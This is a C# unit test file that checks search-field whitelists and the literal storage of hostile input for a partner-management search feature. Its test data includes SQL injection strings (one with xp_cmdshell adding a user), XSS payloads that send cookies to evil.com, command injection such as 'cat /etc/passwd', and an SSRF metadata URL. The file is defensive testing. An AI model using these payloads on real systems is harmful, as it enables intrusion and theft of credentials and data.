using FluentAssertions;
using System.Text.Json;
using UNOPS.PAO.Models.Search;
using Xunit;

namespace UNOPS.PAO.IntegrationTests.UnitTests;

/// <summary>
/// Security-focused tests for search functionality: SQL injection, XSS payloads,
/// field injection, field whitelisting validation, and boundary edge cases.
/// These tests validate that malicious inputs are stored as literal strings
/// and that field whitelisting logic correctly rejects disallowed fields.
/// </summary>
public class SearchSecurityAndEdgeCaseTests
{
    private static readonly HashSet<string> PartnerAllowedFields = new(StringComparer.OrdinalIgnoreCase)
    {
        "id", "name", "status", "partnerShortDescription", "partnerLongDescription",
        "partnerCategoryId", "liaisonOfficeId", "partnerFocalPointUserId",
        "partnerGroupId", "partnerGroupCode", "erpDimValue",
        "unAndStateEntity", "keyGlobalPartner", "unSecretariatPartner",
        "dueDiligenceRequired", "dueDiligenceApproval", "dueDiligenceApprovalDate", "dueDiligenceExpiryDate",
        "partnerApprovalStatus", "partnerApprovalDate", "partnerApprovalReference", "partnerApprovedBy",
        "partnerLevyStatus", "reasonForLevy", "levyTreatment",
        "pooledFund", "canCreateNewOpportunities", "reasonForNoNewOpportunity",
        "partnerGroup.name", "partnerGroup.code", "partnerGroup.description",
        "liaisonOffice.name", "liaisonOffice.code",
        "contacts.firstName", "contacts.lastName", "contacts.email", "contacts.title",
        "contacts.department", "contacts.phone", "contacts.mobile", "contacts.description",
        "contacts.assistant", "contacts.assistantEmail", "contacts.assistantPhone",
        "contacts.mailingCity", "contacts.mailingStateProvince", "contacts.mailingCountry",
        "organizationUnitRelationships.organizationHierarchy.name",
        "createdDate", "lastModifiedDate", "createdBy", "lastModifiedBy", "isDeleted"
    };

    private static readonly HashSet<string> ContactAllowedFields = new(StringComparer.OrdinalIgnoreCase)
    {
        "id", "salutation", "firstName", "middleName", "lastName", "suffix",
        "title", "department", "description", "email", "phone", "mobile",
        "assistant", "assistantPhone", "assistantEmail", "status",
        "mailingStreet", "mailingStreet2", "mailingCity", "mailingStateProvince",
        "mailingPostalCode", "mailingCountry", "profilePictureUrl",
        "partner.name", "partner.status", "partner.partnerShortDescription",
        "partnerId", "partnerName", "partnerStatus", "partnerShortName",
        "interactions.type", "interactions.subject", "interactions.description",
        "interactions.date", "interactions.fromDate", "interactions.toDate",
        "createdDate", "lastModifiedDate", "createdBy", "lastModifiedBy", "isDeleted"
    };

    private static readonly HashSet<string> InteractionAllowedFields = new(StringComparer.OrdinalIgnoreCase)
    {
        "id", "contactId", "type", "date", "fromDate", "toDate", "description", "subject",
        "contact.firstName", "contact.lastName", "contact.email", "contact.title",
        "contact.department", "contact.phone", "contact.mobile",
        "contactName", "contactFirstName", "contactLastName", "contactEmail",
        "partner.name", "partner.status", "partner.partnerShortDescription",
        "partnerName", "partnerStatus",
        "partner.partnerGroup.name", "partner.partnerGroup.code",
        "partner.liaisonOffice.name", "partner.liaisonOffice.code",
        "createdDate", "lastModifiedDate", "createdBy", "lastModifiedBy", "isDeleted"
    };

    private static readonly HashSet<string> ValidOperators = new(StringComparer.OrdinalIgnoreCase)
    {
        "is", "is not", "like", "not like", ">", "<", ">=", "<=", "after", "before", "between"
    };

    private static readonly HashSet<string> ValidLogicalOperators = new(StringComparer.OrdinalIgnoreCase)
    {
        "AND", "OR"
    };

    #region Positive Tests

    [Fact]
    public void ValidSearchInput_WithNormalText_PassesAllValidation()
    {
        var criteria = new SearchCriteria
        {
            Field = "name",
            Value = "ACME Corporation",
            Operator = "like",
            LogicalOperator = "AND"
        };

        PartnerAllowedFields.Contains(criteria.Field).Should().BeTrue();
        ValidOperators.Contains(criteria.Operator).Should().BeTrue();
        ValidLogicalOperators.Contains(criteria.LogicalOperator!).Should().BeTrue();
        string.IsNullOrWhiteSpace(criteria.Value).Should().BeFalse();
    }

    [Fact]
    public void ValidSearchInput_NavigationFields_AcceptedByWhitelist()
    {
        var navigationFields = new[]
        {
            "contacts.firstName", "partnerGroup.name",
            "liaisonOffice.name", "contacts.email"
        };

        foreach (var field in navigationFields)
        {
            PartnerAllowedFields.Contains(field).Should().BeTrue(
                $"Navigation field '{field}' should be in the Partner allowed fields whitelist");
        }
    }

    [Fact]
    public void ValidSearchInput_AuditFields_AcceptedByWhitelist()
    {
        var auditFields = new[] { "createdDate", "lastModifiedDate", "createdBy", "lastModifiedBy", "isDeleted" };

        foreach (var field in auditFields)
        {
            PartnerAllowedFields.Contains(field).Should().BeTrue($"Audit field '{field}' should be allowed for Partners");
            ContactAllowedFields.Contains(field).Should().BeTrue($"Audit field '{field}' should be allowed for Contacts");
            InteractionAllowedFields.Contains(field).Should().BeTrue($"Audit field '{field}' should be allowed for Interactions");
        }
    }

    #endregion

    #region Negative Tests - SQL Injection

    [Theory]
    [InlineData("'; DROP TABLE partners; --")]
    [InlineData("1 OR 1=1")]
    [InlineData("' UNION SELECT * FROM users --")]
    [InlineData("1; DELETE FROM partners WHERE 1=1; --")]
    [InlineData("' OR '1'='1")]
    [InlineData("admin'--")]
    [InlineData("'; EXEC xp_cmdshell('net user hack /add');--")]
    [InlineData("' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--")]
    [InlineData("'); WAITFOR DELAY '0:0:10';--")]
    public void SearchInput_SqlInjectionPayloads_StoredAsLiteralText(string sqlPayload)
    {
        var criteria = new SearchCriteria
        {
            Field = "name",
            Value = sqlPayload,
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Value.Should().Be(sqlPayload, "SQL injection payload should be stored as-is, not executed");
    }

    #endregion

    #region Negative Tests - XSS

    [Theory]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("<img src=x onerror=alert(1)>")]
    [InlineData("javascript:alert(document.cookie)")]
    [InlineData("<svg onload=alert(1)>")]
    [InlineData("'\"><script>fetch('https://evil.com?c='+document.cookie)</script>")]
    [InlineData("<iframe src='https://evil.com'></iframe>")]
    public void SearchInput_XSSPayloads_StoredAsLiteralText(string xssPayload)
    {
        var criteria = new SearchCriteria
        {
            Field = "description",
            Value = xssPayload,
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Value.Should().Be(xssPayload, "XSS payload should be stored as literal text");
    }

    #endregion

    #region Negative Tests - Field Injection

    [Theory]
    [InlineData("password")]
    [InlineData("passwordHash")]
    [InlineData("secretKey")]
    [InlineData("apiKey")]
    [InlineData("token")]
    [InlineData("connectionString")]
    [InlineData("__proto__")]
    [InlineData("constructor")]
    public void SearchInput_DisallowedFields_RejectedByWhitelist(string disallowedField)
    {
        PartnerAllowedFields.Contains(disallowedField).Should().BeFalse(
            $"Field '{disallowedField}' should NOT be in the allowed fields whitelist");
        ContactAllowedFields.Contains(disallowedField).Should().BeFalse(
            $"Field '{disallowedField}' should NOT be in the Contact allowed fields whitelist");
        InteractionAllowedFields.Contains(disallowedField).Should().BeFalse(
            $"Field '{disallowedField}' should NOT be in the Interaction allowed fields whitelist");
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("\t")]
    [InlineData("\n")]
    public void SearchInput_EmptyOrWhitespaceField_NotInWhitelist(string emptyField)
    {
        PartnerAllowedFields.Contains(emptyField).Should().BeFalse();
    }

    [Fact]
    public void SearchInput_PathTraversalInField_RejectedByWhitelist()
    {
        var pathTraversals = new[] { "../../../etc/passwd", "..\\..\\web.config", "name/../password" };

        foreach (var field in pathTraversals)
        {
            PartnerAllowedFields.Contains(field).Should().BeFalse(
                $"Path traversal attempt '{field}' should not be in allowed fields");
        }
    }

    [Theory]
    [InlineData("INVALID")]
    [InlineData("equals")]
    [InlineData("contains")]
    [InlineData("DROP")]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("!=")]
    [InlineData("==")]
    public void SearchInput_InvalidOperators_NotInValidSet(string invalidOp)
    {
        ValidOperators.Contains(invalidOp).Should().BeFalse(
            $"Operator '{invalidOp}' should not be valid (operators are case-sensitive except for the defined set)");
    }

    [Fact]
    public void SearchInput_NullBytesInValue_StoredAsLiteral()
    {
        var criteria = new SearchCriteria
        {
            Field = "name",
            Value = "test\0injected",
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized.Should().NotBeNull();
    }

    #endregion

    #region Edge/Boundary Tests

    [Fact]
    public void SearchInput_ExtremelyLongValue_10000Chars_Accepted()
    {
        var longValue = new string('X', 10000);
        var criteria = new SearchCriteria
        {
            Field = "description",
            Value = longValue,
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Value.Should().HaveLength(10000);
    }

    [Fact]
    public void SearchInput_SingleCharacterValue_Accepted()
    {
        var criteria = new SearchCriteria { Field = "name", Value = "A", Operator = "like" };

        criteria.Value.Should().HaveLength(1);
    }

    [Fact]
    public void SearchInput_UnicodeEmoji_PreservedInSerialization()
    {
        var criteria = new SearchCriteria
        {
            Field = "description",
            Value = "Partner meeting 🤝 went well 👍",
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Value.Should().Contain("🤝");
        deserialized.Value.Should().Contain("👍");
    }

    [Fact]
    public void SearchInput_RtlCharacters_PreservedInSerialization()
    {
        var criteria = new SearchCriteria
        {
            Field = "name",
            Value = "شركة الاتصالات العربية",
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Value.Should().Be("شركة الاتصالات العربية");
    }

    [Fact]
    public void SearchInput_MixedScripts_PreservedInSerialization()
    {
        var criteria = new SearchCriteria
        {
            Field = "name",
            Value = "ABC Corp 日本語テスト العربية Кириллица",
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Value.Should().Be("ABC Corp 日本語テスト العربية Кириллица");
    }

    [Fact]
    public void SearchInput_ControlCharacters_StoredInJson()
    {
        var criteria = new SearchCriteria
        {
            Field = "name",
            Value = "test\ttab\nnewline\rreturn",
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Value.Should().Contain("\t");
        deserialized.Value.Should().Contain("\n");
    }

    [Fact]
    public void SearchInput_MaxInt_EntityIdInSearchResult()
    {
        var result = new GlobalSearchResult { EntityId = int.MaxValue };
        result.EntityId.Should().Be(int.MaxValue);
    }

    [Fact]
    public void SearchInput_MinInt_EntityIdInSearchResult()
    {
        var result = new GlobalSearchResult { EntityId = int.MinValue };
        result.EntityId.Should().Be(int.MinValue);
    }

    [Fact]
    public void SearchInput_HtmlEntitiesInValue_StoredAsLiteral()
    {
        var criteria = new SearchCriteria
        {
            Field = "name",
            Value = "&lt;script&gt;alert(1)&lt;/script&gt;",
            Operator = "like"
        };

        criteria.Value.Should().Contain("&lt;");
        criteria.Value.Should().Contain("&gt;");
    }

    [Fact]
    public void SearchInput_DeeplyNestedNavigationPath_NotInWhitelist()
    {
        var deepPaths = new[]
        {
            "a.b.c.d.e.f.g",
            "partner.contacts.interactions.partner.name",
            "this.is.way.too.deep.to.be.valid"
        };

        foreach (var path in deepPaths)
        {
            PartnerAllowedFields.Contains(path).Should().BeFalse(
                $"Deeply nested path '{path}' should not be in the whitelist");
        }
    }

    [Fact]
    public void FieldWhitelist_CaseInsensitive_MatchesAnyCase()
    {
        PartnerAllowedFields.Contains("name").Should().BeTrue();
        PartnerAllowedFields.Contains("NAME").Should().BeTrue();
        PartnerAllowedFields.Contains("Name").Should().BeTrue();
        PartnerAllowedFields.Contains("nAmE").Should().BeTrue();
    }

    #endregion

    #region Functional Tests - Field Whitelisting

    [Fact]
    public void AllowedFields_Partner_ContainsAllExpectedDirectFields()
    {
        var expectedDirectFields = new[]
        {
            "id", "name", "status", "partnerShortDescription", "partnerLongDescription",
            "partnerCategoryId", "liaisonOfficeId", "partnerGroupId",
            "pooledFund", "canCreateNewOpportunities"
        };

        foreach (var field in expectedDirectFields)
        {
            PartnerAllowedFields.Contains(field).Should().BeTrue(
                $"Partner direct field '{field}' should be in the whitelist");
        }
    }

    [Fact]
    public void AllowedFields_Contact_ContainsAllExpectedDirectFields()
    {
        var expectedFields = new[]
        {
            "id", "firstName", "lastName", "email", "title", "department",
            "phone", "mobile", "mailingCity", "mailingCountry", "status"
        };

        foreach (var field in expectedFields)
        {
            ContactAllowedFields.Contains(field).Should().BeTrue(
                $"Contact direct field '{field}' should be in the whitelist");
        }
    }

    [Fact]
    public void AllowedFields_Interaction_ContainsAllExpectedDirectFields()
    {
        var expectedFields = new[]
        {
            "id", "contactId", "type", "date", "fromDate", "toDate", "description", "subject"
        };

        foreach (var field in expectedFields)
        {
            InteractionAllowedFields.Contains(field).Should().BeTrue(
                $"Interaction direct field '{field}' should be in the whitelist");
        }
    }

    [Fact]
    public void AllowedFields_Partner_ContainsContactNavigationFields()
    {
        var contactNavFields = new[]
        {
            "contacts.firstName", "contacts.lastName", "contacts.email",
            "contacts.title", "contacts.department"
        };

        foreach (var field in contactNavFields)
        {
            PartnerAllowedFields.Contains(field).Should().BeTrue(
                $"Partner should allow searching contacts by '{field}'");
        }
    }

    [Fact]
    public void AllowedFields_Contact_ContainsPartnerNavigationFields()
    {
        var partnerNavFields = new[] { "partner.name", "partner.status", "partnerId", "partnerName" };

        foreach (var field in partnerNavFields)
        {
            ContactAllowedFields.Contains(field).Should().BeTrue(
                $"Contact should allow searching partner by '{field}'");
        }
    }

    [Fact]
    public void AllowedFields_Interaction_ContainsContactAndPartnerFields()
    {
        var navFields = new[]
        {
            "contact.firstName", "contact.lastName", "contact.email",
            "partner.name", "partner.status",
            "contactName", "partnerName"
        };

        foreach (var field in navFields)
        {
            InteractionAllowedFields.Contains(field).Should().BeTrue(
                $"Interaction should allow navigation field '{field}'");
        }
    }

    [Fact]
    public void ValidOperators_ContainsAllExpected()
    {
        var expected = new[] { "is", "is not", "like", "not like", ">", "<", ">=", "<=", "after", "before", "between" };

        foreach (var op in expected)
        {
            ValidOperators.Contains(op).Should().BeTrue($"Operator '{op}' should be valid");
        }

        ValidOperators.Should().HaveCount(11);
    }

    [Fact]
    public void ValidLogicalOperators_ContainsOnlyANDandOR()
    {
        ValidLogicalOperators.Should().HaveCount(2);
        ValidLogicalOperators.Contains("AND").Should().BeTrue();
        ValidLogicalOperators.Contains("OR").Should().BeTrue();
    }

    [Fact]
    public void FieldWhitelist_NoOverlapOfSensitiveEntityFields()
    {
        var sensitiveFields = new[]
        {
            "password", "passwordHash", "salt", "securityStamp", "refreshToken",
            "apiKey", "secretKey", "privateKey", "connectionString", "token"
        };

        foreach (var field in sensitiveFields)
        {
            PartnerAllowedFields.Should().NotContain(field, $"Sensitive field '{field}' must never be searchable");
            ContactAllowedFields.Should().NotContain(field, $"Sensitive field '{field}' must never be searchable");
            InteractionAllowedFields.Should().NotContain(field, $"Sensitive field '{field}' must never be searchable");
        }
    }

    [Fact]
    public void ValidOperators_CaseInsensitive_MatchesMixedCase()
    {
        ValidOperators.Contains("IS").Should().BeTrue();
        ValidOperators.Contains("Like").Should().BeTrue();
        ValidOperators.Contains("BETWEEN").Should().BeTrue();
        ValidOperators.Contains("After").Should().BeTrue();
    }

    [Fact]
    public void SearchCriteria_ValidateFieldOperatorCombination_TextFieldWithTextOperators()
    {
        var textOperators = new[] { "is", "is not", "like", "not like" };

        foreach (var op in textOperators)
        {
            ValidOperators.Contains(op).Should().BeTrue($"Text operator '{op}' should be valid");
        }
    }

    [Fact]
    public void SearchCriteria_ValidateFieldOperatorCombination_DateFieldWithDateOperators()
    {
        var dateOperators = new[] { "after", "before", "between", ">", "<", ">=", "<=" };

        foreach (var op in dateOperators)
        {
            ValidOperators.Contains(op).Should().BeTrue($"Date operator '{op}' should be valid");
        }
    }

    #endregion

    #region Integration Tests - Complex Security Scenarios

    [Fact]
    public void SearchCriteria_ComplexMaliciousPayload_AllFieldsValidatedAgainstWhitelist()
    {
        var maliciousCriteria = new List<SearchCriteria>
        {
            new() { Field = "name", Value = "'; DROP TABLE partners; --", Operator = "like" },
            new() { Field = "status", Value = "<script>alert(1)</script>", Operator = "is" },
            new() { Field = "password", Value = "admin123", Operator = "is" }
        };

        maliciousCriteria[0].Field.Should().Be("name");
        PartnerAllowedFields.Contains("name").Should().BeTrue("name is a valid field");

        PartnerAllowedFields.Contains("password").Should().BeFalse("password should be rejected by whitelist");

        var validCriteria = maliciousCriteria.Where(c => PartnerAllowedFields.Contains(c.Field)).ToList();
        validCriteria.Should().HaveCount(2, "only 'name' and 'status' should pass whitelist validation");
    }

    [Fact]
    public void SearchCriteria_MixedValidAndInvalidFields_WhitelistFiltersCorrectly()
    {
        var criteria = new List<SearchCriteria>
        {
            new() { Field = "firstName", Value = "John", Operator = "like" },
            new() { Field = "email", Value = "test@test.com", Operator = "is" },
            new() { Field = "internalNotes", Value = "secret", Operator = "like" },
            new() { Field = "partner.name", Value = "ACME", Operator = "like" },
            new() { Field = "admin.password", Value = "hack", Operator = "is" }
        };

        var validCount = criteria.Count(c => ContactAllowedFields.Contains(c.Field));
        var invalidCount = criteria.Count(c => !ContactAllowedFields.Contains(c.Field));

        validCount.Should().Be(3, "firstName, email, and partner.name should pass");
        invalidCount.Should().Be(2, "internalNotes and admin.password should fail");
    }

    [Fact]
    public void SearchCriteria_SqlInjectionInAllFields_AllStoredAsLiteral()
    {
        var sqlPayload = "' OR 1=1; --";
        var criteria = new SearchCriteria
        {
            Field = sqlPayload,
            Value = sqlPayload,
            Label = sqlPayload,
            Operator = sqlPayload,
            LogicalOperator = sqlPayload,
            SecondValue = sqlPayload,
            FieldType = sqlPayload
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Field.Should().Be(sqlPayload);
        deserialized.Value.Should().Be(sqlPayload);
        deserialized.Label.Should().Be(sqlPayload);
        deserialized.Operator.Should().Be(sqlPayload);
        deserialized.LogicalOperator.Should().Be(sqlPayload);
        deserialized.SecondValue.Should().Be(sqlPayload);
        deserialized.FieldType.Should().Be(sqlPayload);
    }

    [Fact]
    public void SearchCriteria_RealWorldMaliciousPayload_FullJsonRoundTrip()
    {
        var maliciousJson = """
        [
            {
                "field":"name","value":"'; DELETE FROM partners WHERE 1=1;--","operator":"like","logicalOperator":"AND","fieldType":"text"
            },
            {
                "field":"description","value":"<script>document.location='https://evil.com?c='+document.cookie</script>","operator":"like","logicalOperator":"OR","fieldType":"text"
            }
        ]
        """;

        var options = new JsonSerializerOptions { PropertyNamingPolicy = JsonNamingPolicy.CamelCase };
        var criteria = JsonSerializer.Deserialize<List<SearchCriteria>>(maliciousJson, options);

        criteria.Should().HaveCount(2);
        criteria![0].Value.Should().Contain("DELETE FROM partners");
        criteria[1].Value.Should().Contain("<script>");

        PartnerAllowedFields.Contains(criteria[0].Field).Should().BeTrue("'name' is a valid field");
        PartnerAllowedFields.Contains(criteria[1].Field).Should().BeFalse("'description' is not in Partner whitelist");
    }

    [Fact]
    public void SearchCriteria_CrossEntityFieldInjection_BlockedByEntitySpecificWhitelists()
    {
        var partnerOnlyField = "partnerGroupId";
        var contactOnlyField = "firstName";

        PartnerAllowedFields.Contains(partnerOnlyField).Should().BeTrue();
        ContactAllowedFields.Contains(partnerOnlyField).Should().BeFalse(
            "partnerGroupId should not be directly searchable on Contact entity");

        ContactAllowedFields.Contains(contactOnlyField).Should().BeTrue();
        PartnerAllowedFields.Contains(contactOnlyField).Should().BeFalse(
            "firstName is not a direct Partner field (only available as contacts.firstName)");
    }

    [Fact]
    public void SearchCriteria_LDAPInjection_StoredAsLiteral()
    {
        var ldapPayload = "*)(&(objectClass=*)";
        var criteria = new SearchCriteria
        {
            Field = "name",
            Value = ldapPayload,
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Value.Should().Be(ldapPayload);
    }

    [Fact]
    public void SearchCriteria_CommandInjection_StoredAsLiteral()
    {
        var cmdPayloads = new[]
        {
            "; cat /etc/passwd",
            "| ls -la",
            "$(whoami)",
            "`id`"
        };

        foreach (var payload in cmdPayloads)
        {
            var criteria = new SearchCriteria { Field = "name", Value = payload, Operator = "like" };
            var json = JsonSerializer.Serialize(criteria);
            var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

            deserialized!.Value.Should().Be(payload,
                $"Command injection payload '{payload}' should be stored as literal text");
        }
    }

    [Fact]
    public void SearchCriteria_NoSQLInjection_StoredAsLiteral()
    {
        var noSqlPayloads = new[]
        {
            "{\"$gt\":\"\"}",
            "{\"$ne\":null}",
            "{\"$where\":\"sleep(5000)\"}",
            "true, $where: '1 == 1'"
        };

        foreach (var payload in noSqlPayloads)
        {
            var criteria = new SearchCriteria { Field = "name", Value = payload, Operator = "like" };
            var json = JsonSerializer.Serialize(criteria);
            var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

            deserialized!.Value.Should().Be(payload,
                $"NoSQL injection payload should be stored as literal text");
        }
    }

    [Fact]
    public void SearchCriteria_SSRFPayload_StoredAsLiteral()
    {
        var criteria = new SearchCriteria
        {
            Field = "name",
            Value = "http://169.254.169.254/latest/meta-data/",
            Operator = "like"
        };

        var json = JsonSerializer.Serialize(criteria);
        var deserialized = JsonSerializer.Deserialize<SearchCriteria>(json);

        deserialized!.Value.Should().Contain("169.254.169.254");
    }

    [Fact]
    public void AllowedFields_EachEntityType_HasUniqueSecurityScope()
    {
        var partnerOnly = PartnerAllowedFields.Except(ContactAllowedFields).Except(InteractionAllowedFields);
        var contactOnly = ContactAllowedFields.Except(PartnerAllowedFields).Except(InteractionAllowedFields);
        var interactionOnly = InteractionAllowedFields.Except(PartnerAllowedFields).Except(ContactAllowedFields);

        partnerOnly.Should().NotBeEmpty("Partners should have unique fields like partnerGroupId, dueDiligence fields");
        contactOnly.Should().NotBeEmpty("Contacts should have unique fields like salutation, middleName");
        interactionOnly.Should().NotBeEmpty("Interactions should have unique fields like contactId, type");
    }

    #endregion
}
